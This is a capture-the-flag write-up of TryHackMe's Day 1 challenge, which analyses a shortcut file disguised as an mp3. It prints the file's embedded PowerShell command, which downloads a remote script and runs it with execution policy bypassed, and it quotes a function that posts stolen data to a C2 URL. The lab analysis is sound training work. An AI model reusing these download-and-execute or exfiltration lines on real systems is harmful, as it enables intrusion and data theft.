# Try Hack Me

##  Day 1: Maybe SOC-mas music, he thought, doesn't come from a store?

### Looks like the song.mp3 file is not what we expected! Run "exiftool song.mp3" in your terminal to find out the author of the song. Who is the author? 


```shell
exiftool somg.mp3 
ExifTool Version Number         : 13.04
File Name                       : somg.mp3
Directory                       : .
File Size                       : 2.2 kB
File Modification Date/Time     : 2024:10:30 14:32:52-03:00
File Access Date/Time           : 2024:12:01 18:40:22-03:00
File Inode Change Date/Time     : 2024:12:01 18:40:21-03:00
File Permissions                : -rw-rw-r--
File Type                       : LNK
File Type Extension             : lnk
MIME Type                       : application/octet-stream
Flags                           : IDList, LinkInfo, RelativePath, WorkingDir, CommandArgs, Unicode, TargetMetadata
File Attributes                 : Archive
Create Date                     : 2018:09:15 04:14:14-03:00
Access Date                     : 2018:09:15 04:14:14-03:00
Modify Date                     : 2018:09:15 04:14:14-03:00
Target File Size                : 448000
Icon Index                      : (none)
Run Window                      : Normal
Hot Key                         : (none)
Target File DOS Name            : powershell.exe
Drive Type                      : Fixed Disk
Drive Serial Number             : A8A4-C362
Volume Label                    : 
Local Base Path                 : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Relative Path                   : ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Working Directory               : C:\Windows\System32\WindowsPowerShell\v1.0
Command Line Arguments          : -ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"
Machine ID                      : win-base-2019
```

```shell
exiftool song.mp3
ExifTool Version Number         : 13.04
File Name                       : song.mp3
Directory                       : .
File Size                       : 4.6 MB
File Modification Date/Time     : 2024:10:24 09:50:46-03:00
File Access Date/Time           : 2024:12:01 18:40:22-03:00
File Inode Change Date/Time     : 2024:12:01 18:40:21-03:00
File Permissions                : -rwxrwxr-x
File Type                       : MP3
File Type Extension             : mp3
MIME Type                       : audio/mpeg
MPEG Audio Version              : 1
Audio Layer                     : 3
Audio Bitrate                   : 192 kbps
Sample Rate                     : 44100
Channel Mode                    : Stereo
MS Stereo                       : Off
Intensity Stereo                : Off
Copyright Flag                  : False
Original Media                  : False
Emphasis                        : None
ID3 Size                        : 2176
Artist                          : Tyler Ramsbey
Album                           : Rap
Title                           : Mount HackIt
Encoded By                      : Mixcraft 10.5 Recording Studio Build 621
Year                            : 2024
Genre                           : Rock
Track                           : 0/1
Comment                         : 
Date/Time Original              : 2024
Duration                        : 0:03:11 (approx)
```

*Answer: Tyler Ramsbey*

### The malicious PowerShell script sends stolen info to a C2 server. What is the URL of this C2 server?

Going into `https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1`

We can see this code

```ps1
function Send-InfoToC2Server {
    $c2Url = "http://papash3ll.thm/data"
    $data = Get-Content -Path $infoFilePath -Raw

    # Using Invoke-WebRequest to send data to the C2 server
    Invoke-WebRequest -Uri $c2Url -Method Post -Body $data
}
```

*Answer: http://papash3ll.thm/data*

### Who is M.M? Maybe his Github profile page would provide clues?

Going into this readme `https://github.com/MM-WarevilleTHM/M.M`

*Answer: Mayor Malware*

### What is the number of commits on the GitHub repo where the issue was raised?

Going into the repository itself within commits we can see them

`https://github.com/MM-WarevilleTHM/IS/commits/main/`

*Answer: 1